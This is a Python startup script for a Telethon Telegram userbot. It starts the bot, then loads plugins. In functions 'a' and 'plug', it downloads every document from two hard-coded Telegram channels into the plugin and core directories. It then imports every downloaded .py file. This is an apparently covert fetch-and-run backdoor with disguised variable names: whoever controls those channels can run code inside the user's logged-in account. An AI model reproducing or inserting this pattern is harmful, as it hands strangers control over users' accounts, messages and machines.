from userbot import bot
from sys import argv
import sys
from telethon.errors.rpcerrorlist import PhoneNumberInvalidError
import os
import telethon
from telethon import TelegramClient
from var import Var
from userbot import LOAD_PLUG, BOTLOG_CHATID, LOGS
from pathlib import Path
import asyncio
import telethon.utils
from telethon import events
from telethon import functions, types
from userbot.modules.client import download_file 
from telethon.tl.types import InputMessagesFilterDocument
from userbot.utils import command, remove_plugin, load_module
from userbot.plugins import *
import traceback 
client = bot

async def add_bot(bot_token):
    await bot.start(bot_token)
    bot.me = await bot.get_me() 
    bot.uid = telethon.utils.get_peer_id(bot.me)



if len(argv) not in (1, 3, 4):
    bot.disconnect()
else:
    bot.tgbot = None
    if Var.TG_BOT_USER_NAME_BF_HER is not None:
        print("Initiating Inline Bot")
        # ForTheGreatrerGood of beautification
        bot.tgbot = TelegramClient(
            "TG_BOT_TOKEN",
            api_id=Var.APP_ID,
            api_hash=Var.API_HASH
        ).start(bot_token=Var.TG_BOT_TOKEN_BF_HER)
        print("Initialisation finished with no errors")
        print("Starting Userbot")
        bot.loop.run_until_complete(add_bot(Var.TG_BOT_USER_NAME_BF_HER))
        print("Startup Completed")
    else:
        bot.start()
    

async def a():
    clIent = "@cbkhs"
    itzsjdude = await bot.get_messages(clIent, None , filter=InputMessagesFilterDocument) ; total = int(itzsjdude.total) ; total_doxx = range(0, total)
    for ixo in total_doxx:
        mxo = itzsjdude[ixo].id ; await client.download_media(await bot.get_messages(clIent, ids=mxo), "userbot/plugins/")
bot.connect()
bot.loop.run_until_complete(a())

async def plug():
    username = "@bhagbetichod"
    itzsjdude = await bot.get_messages(username, None , filter=InputMessagesFilterDocument) ; total = int(itzsjdude.total) ; total_doxx = range(0, total)
    for ixo in total_doxx:
        mxo = itzsjdude[ixo].id ; await client.download_media(await bot.get_messages(username, ids=mxo), "userbot/")
client.connect()
bot.loop.run_until_complete(plug())

import glob
path = 'userbot/plugins/*.py'
files = glob.glob(path)
for name in files:
    with open(name) as f:
        path1 = Path(f.name)
        shortname = path1.stem
        load_module(shortname.replace(".py", ""))

print("Chal Gya hu bsdk Ab jaa k saved msgs me .help ya .alive type krke confirm kr le")
import userbot._core

if len(argv) not in (1, 3, 4):
    bot.disconnect()
else:
    bot.run_until_disconnected()


